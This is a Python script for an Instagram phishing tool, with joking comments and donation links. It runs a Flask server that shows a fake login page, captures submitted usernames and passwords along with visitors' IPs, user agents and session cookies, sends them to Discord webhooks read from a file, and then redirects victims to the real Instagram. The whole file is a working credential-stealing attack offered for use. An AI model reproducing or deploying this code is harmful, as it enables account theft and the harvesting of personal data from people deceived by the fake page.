# by Divided
# www.linktr.ee/cantstopdivided
# www.zayd099.carrd.co/#sendmemoney
# ^ send me money uwu :3
# if i raise at least $30.99 worth of donations before April,
# i'll do paypal
# discord.gg/6MdgHjbyYh
import os #os for operating system. zayde makes divinixOS when
import platform #wmc real
import threading #gem likes to thread lol
import random #randomness like zayde venting
import time #hannah has the pocket watch like marcelly
from flask import Flask, render_template, request, make_response, redirect #zayde hates plastic
import requests #i request hrt now b*tch NOW!!

import pygame #none genz coder pov: is this really needed bruuvvvv

def get_random_track():
    tracks = [f for f in os.listdir("tracks") if f.endswith(".mp3")]
    return os.path.join("tracks", random.choice(tracks)) if tracks else None

def play_music():
    pygame.mixer.init()
    while True:
        track = get_random_track()
        if track:
            pygame.mixer.music.load(track)
            pygame.mixer.music.play()
            while pygame.mixer.music.get_busy():
                pygame.time.Clock().tick(10)
        time.sleep(1)

def clear():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def InstagOwOwO():
    threading.Thread(target=play_music, daemon=True).start()
    while True:
        clear()

        colors = ["\033[31m", "\033[33m", "\033[32m", "\033[36m", "\033[34m", "\033[35m"]
        with open("banner.txt", "r") as file:
            color_index = 0
            for line in file:
                print(colors[color_index] + line.replace("\n", "") + "\033[0m")
                color_index = (color_index + 1) % len(colors)

        time.sleep(1)

        print('''
just go with port 80 or port 5000 probably, if neither work just
keep trying random ports in till it works lol\n
after entering the port number, it might ask you again, just put in
the same port number again
UwU
        ''')
        port_number = input(">> port number: ")
        print("\ncommand read miss. prepare to launch!\n")
        time.sleep(1)
        print("THREE")
        time.sleep(1)
        print("TWO")
        time.sleep(1)
        print("ONE\nlet's go uh oh, let's go!! TONIGHT WE'RE GOING HARRRRRDDDD")

        app = Flask(__name__)

        #add as many webhooks as u want lol
        def load_webhooks():
            webhooks = []
            with open('webhooks.txt', 'r') as file:
                for line in file:
                    if line.startswith("https://") or line.startswith("http://"):
                        webhooks.append(line.strip())
            return webhooks

        WEBHOOK_URLS = load_webhooks()

        def send_to_webhooks(log_entry):
            discord_payload = {
                "content": log_entry
            }
            for url in WEBHOOK_URLS:
                requests.post(url, json=discord_payload)

        @app.route('/', methods=['GET', 'POST'])
        def home():
            start_time = time.time()
            
            if request.method == 'POST':
                data = request.form
                if 'username' in data and 'password' in data:
                    response = make_response(redirect("https://instagram.com"))
                    duration = time.time() - start_time
                    log_request(request, response, duration)
                    return response
                
                response = make_response(render_template('login.html'))
                duration = time.time() - start_time
                log_request(request, response, duration)
            
            else:
                response = make_response(render_template('login.html'))
                duration = time.time() - start_time
                log_request(request, response, duration)
            
            return response

        def log_request(req, response, duration):
            user_id = random.randint(100, 999)
            real_ip = req.headers.get('X-Forwarded-For', req.remote_addr).split(',')[0]
            ip_address = req.remote_addr
            user_agent = req.headers.get('User-Agent')
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())
            method = req.method
            content_type = req.content_type
            status_code = response.status_code
            request_path = req.path
            query_params = req.args
            referer = req.headers.get('Referer', '')
            session_id = request.cookies.get('session_id', 'N/A')

            if req.is_json:
                data = req.get_json()
            else:
                data = req.form

            log_entry = f"# USER {user_id}\n# {'-' * 80}\n"
            log_entry += f"Timestamp: {timestamp}\n"
            log_entry += f"IP Address (direct): {ip_address}\n"
            log_entry += f"Real Client IP: {real_ip}\n"
            log_entry += f"User Agent: {user_agent}\n"
            log_entry += f"Request Method: {method}\n"
            log_entry += f"Content Type: {content_type}\n"
            log_entry += f"Status Code: {status_code}\n"
            log_entry += f"Request Duration: {duration:.3f}s\n"
            log_entry += f"Request Path: {request_path}\n"
            log_entry += f"Query Parameters: {query_params}\n"
            log_entry += f"Referer: {referer}\n"
            log_entry += f"Session ID: {session_id}\n"
            log_entry += f"Request Data:\n{data}\n\n"
            log_entry += f"# {'-' * 80}\n\n"

            send_to_webhooks(log_entry)

        if __name__ == '__main__':
            #set reloader to True if it's not working or something
            app.run(debug=True, port=port_number, use_reloader=False)

        pygame.time.wait(5000)
        
InstagOwOwO()
